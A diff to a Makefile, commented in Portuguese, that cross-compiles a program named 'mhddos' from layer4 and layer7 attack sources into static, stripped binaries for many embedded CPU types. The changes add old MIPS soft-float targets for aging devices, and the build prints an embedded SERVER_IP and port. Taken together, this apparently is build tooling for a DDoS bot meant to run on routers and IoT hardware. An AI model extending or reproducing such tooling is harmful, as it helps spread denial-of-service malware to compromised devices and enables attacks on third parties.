@@ -11,10 +11,28 @@ CFLAGS = -Wall -Os -D_GNU_SOURCE \
 
 LDFLAGS = -static -Wl,--gc-sections -Wl,-s -Wl,--build-id=none
 
+# ============================================================
+# FLAGS PARA MIPS ANTIGO
+# -march=mips32   = MIPS32 Release 1 (compativel com a maioria)
+# -msoft-float    = nao usa FPU de hardware (evita instrucoes ilegais)
+# -mno-mips16     = nao gera codigo MIPS16
+# -mno-dsp        = nao usa extensoes DSP (nao existe em CPUs antigas)
+#
+# Se -march=mips32 ainda der "Illegal Instruction", tente:
+#   -march=mips1   (o mais basico de todos, MIPS I puro)
+#   -march=mips2
+#   -march=mips3   (64-bit antigo)
+# ============================================================
+MIPS_OLD_FLAGS = -march=mips32 -mtune=mips32 -msoft-float -mno-dsp -mno-mips16
+MIPSEL_OLD_FLAGS = -march=mips32 -mtune=mips32 -msoft-float -mno-dsp -mno-mips16
+
+# Se precisar de algo AINDA mais antigo (MIPS I puro, raro):
+MIPS_OLDEST_FLAGS = -march=mips1 -mtune=mips1 -msoft-float -mno-mips16
+
 SRCS = main.c utils.c layer4.c layer7.c
 TARGET = mhddos
 
-all: x86_64 x86 mips mipsel mips64 arm armhf arm64 armeb ppc sh4
+all: x86_64 x86 mips mipsel mips_old mipsel_old mips_oldest mips64 arm armhf arm64 armeb ppc sh4
 	@echo "=========================================="
 	@echo " SERVER=$(SERVER_IP):$(SERVER_PORT_NUM)"
 	@echo "=========================================="
@@ -32,15 +50,49 @@ x86:
 	i686-linux-gnu-gcc -m32 $(CFLAGS) $(SRCS) -o $(TARGET)_x86 $(LDFLAGS) 2>/dev/null || true
 	@strip -s $(TARGET)_x86 2>/dev/null || true
 
+# ==========================================
+# MIPS NORMAL (padrao do compilador, R2+)
+# ==========================================
 mips:
 	@/opt/mips-linux-musl-cross/bin/mips-linux-musl-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_mips $(LDFLAGS) 2>/dev/null || \
 	mips-linux-gnu-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_mips $(LDFLAGS) 2>/dev/null || true
-	@/opt/mips-linux-musl-cross/bin/mips-linux-musl-strip -s $(TARGET)_mips 2>/dev/null || mips-linux-gnu-strip -s $(TARGET)_mips 2>/dev/null || true
+	@/opt/mips-linux-musl-cross/bin/mips-linux-musl-strip -s $(TARGET)_mips 2>/dev/null || \
+	mips-linux-gnu-strip -s $(TARGET)_mips 2>/dev/null || true
 
 mipsel:
 	@/opt/mipsel-linux-musl-cross/bin/mipsel-linux-musl-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_mipsel $(LDFLAGS) 2>/dev/null || \
 	mipsel-linux-gnu-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_mipsel $(LDFLAGS) 2>/dev/null || true
-	@/opt/mipsel-linux-musl-cross/bin/mipsel-linux-musl-strip -s $(TARGET)_mipsel 2>/dev/null || mipsel-linux-gnu-strip -s $(TARGET)_mipsel 2>/dev/null || true
+	@/opt/mipsel-linux-musl-cross/bin/mipsel-linux-musl-strip -s $(TARGET)_mipsel 2>/dev/null || \
+	mipsel-linux-gnu-strip -s $(TARGET)_mipsel 2>/dev/null || true
+
+# ==========================================
+# MIPS OLD (MIPS32 Release 1 + soft-float)
+# Para dispositivos de ~2015-2020 com CPU antiga
+# ==========================================
+mips_old:
+	@echo "[*] Compilando MIPS OLD (mips32r1 soft-float)..."
+	@/opt/mips-linux-musl-cross/bin/mips-linux-musl-gcc $(CFLAGS) $(MIPS_OLD_FLAGS) $(SRCS) -o $(TARGET)_mips_old $(LDFLAGS) 2>/dev/null || \
+	mips-linux-gnu-gcc $(CFLAGS) $(MIPS_OLD_FLAGS) $(SRCS) -o $(TARGET)_mips_old $(LDFLAGS) 2>/dev/null || true
+	@/opt/mips-linux-musl-cross/bin/mips-linux-musl-strip -s $(TARGET)_mips_old 2>/dev/null || \
+	mips-linux-gnu-strip -s $(TARGET)_mips_old 2>/dev/null || true
+
+mipsel_old:
+	@echo "[*] Compilando MIPSEL OLD (mips32r1 soft-float)..."
+	@/opt/mipsel-linux-musl-cross/bin/mipsel-linux-musl-gcc $(CFLAGS) $(MIPSEL_OLD_FLAGS) $(SRCS) -o $(TARGET)_mipsel_old $(LDFLAGS) 2>/dev/null || \
+	mipsel-linux-gnu-gcc $(CFLAGS) $(MIPSEL_OLD_FLAGS) $(SRCS) -o $(TARGET)_mipsel_old $(LDFLAGS) 2>/dev/null || true
+	@/opt/mipsel-linux-musl-cross/bin/mipsel-linux-musl-strip -s $(TARGET)_mipsel_old 2>/dev/null || \
+	mipsel-linux-gnu-strip -s $(TARGET)_mipsel_old 2>/dev/null || true
+
+# ==========================================
+# MIPS OLDEST (MIPS I puro - o mais compativel possivel)
+# Para dispositivos MUITO antigos
+# ==========================================
+mips_oldest:
+	@echo "[*] Compilando MIPS OLDEST (mips1 soft-float)..."
+	@/opt/mips-linux-musl-cross/bin/mips-linux-musl-gcc $(CFLAGS) $(MIPS_OLDEST_FLAGS) $(SRCS) -o $(TARGET)_mips_oldest $(LDFLAGS) 2>/dev/null || \
+	mips-linux-gnu-gcc $(CFLAGS) $(MIPS_OLDEST_FLAGS) $(SRCS) -o $(TARGET)_mips_oldest $(LDFLAGS) 2>/dev/null || true
+	@/opt/mips-linux-musl-cross/bin/mips-linux-musl-strip -s $(TARGET)_mips_oldest 2>/dev/null || \
+	mips-linux-gnu-strip -s $(TARGET)_mips_oldest 2>/dev/null || true
 
 mips64:
 	@/opt/mips64-linux-musl-cross/bin/mips64-linux-musl-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_mips64 $(LDFLAGS) 2>/dev/null || true
@@ -49,17 +101,20 @@ mips64:
 arm:
 	@/opt/arm-linux-musleabi-cross/bin/arm-linux-musleabi-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_arm $(LDFLAGS) 2>/dev/null || \
 	arm-linux-gnueabi-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_arm $(LDFLAGS) 2>/dev/null || true
-	@/opt/arm-linux-musleabi-cross/bin/arm-linux-musleabi-strip -s $(TARGET)_arm 2>/dev/null || arm-linux-gnueabi-strip -s $(TARGET)_arm 2>/dev/null || true
+	@/opt/arm-linux-musleabi-cross/bin/arm-linux-musleabi-strip -s $(TARGET)_arm 2>/dev/null || \
+	arm-linux-gnueabi-strip -s $(TARGET)_arm 2>/dev/null || true
 
 armhf:
 	@/opt/arm-linux-musleabihf-cross/bin/arm-linux-musleabihf-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_armhf $(LDFLAGS) 2>/dev/null || \
 	arm-linux-gnueabihf-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_armhf $(LDFLAGS) 2>/dev/null || true
-	@/opt/arm-linux-musleabihf-cross/bin/arm-linux-musleabihf-strip -s $(TARGET)_armhf 2>/dev/null || arm-linux-gnueabihf-strip -s $(TARGET)_armhf 2>/dev/null || true
+	@/opt/arm-linux-musleabihf-cross/bin/arm-linux-musleabihf-strip -s $(TARGET)_armhf 2>/dev/null || \
+	arm-linux-gnueabihf-strip -s $(TARGET)_armhf 2>/dev/null || true
 
 arm64:
 	@/opt/aarch64-linux-musl-cross/bin/aarch64-linux-musl-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_arm64 $(LDFLAGS) 2>/dev/null || \
 	aarch64-linux-gnu-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_arm64 $(LDFLAGS) 2>/dev/null || true
-	@/opt/aarch64-linux-musl-cross/bin/aarch64-linux-musl-strip -s $(TARGET)_arm64 2>/dev/null || aarch64-linux-gnu-strip -s $(TARGET)_arm64 2>/dev/null || true
+	@/opt/aarch64-linux-musl-cross/bin/aarch64-linux-musl-strip -s $(TARGET)_arm64 2>/dev/null || \
+	aarch64-linux-gnu-strip -s $(TARGET)_arm64 2>/dev/null || true
 
 armeb:
 	@/opt/armeb-linux-musleabi-cross/bin/armeb-linux-musleabi-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_armeb $(LDFLAGS) 2>/dev/null || true
@@ -68,7 +123,8 @@ armeb:
 ppc:
 	@/opt/powerpc-linux-musl-cross/bin/powerpc-linux-musl-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_ppc $(LDFLAGS) 2>/dev/null || \
 	powerpc-linux-gnu-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_ppc $(LDFLAGS) 2>/dev/null || true
-	@/opt/powerpc-linux-musl-cross/bin/powerpc-linux-musl-strip -s $(TARGET)_ppc 2>/dev/null || powerpc-linux-gnu-strip -s $(TARGET)_ppc 2>/dev/null || true
+	@/opt/powerpc-linux-musl-cross/bin/powerpc-linux-musl-strip -s $(TARGET)_ppc 2>/dev/null || \
+	powerpc-linux-gnu-strip -s $(TARGET)_ppc 2>/dev/null || true
 
 sh4:
 	@/opt/sh4-linux-musl-cross/bin/sh4-linux-musl-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_sh4 $(LDFLAGS) 2>/dev/null || true
@@ -77,4 +133,4 @@ sh4:
 clean:
 	rm -f $(TARGET)_*
 
-.PHONY: all clean x86_64 x86 mips mipsel mips64 arm armhf arm64 armeb ppc sh4
+.PHONY: all clean x86_64 x86 mips mipsel mips_old mipsel_old mips_oldest mips64 arm armhf arm64 armeb ppc sh4
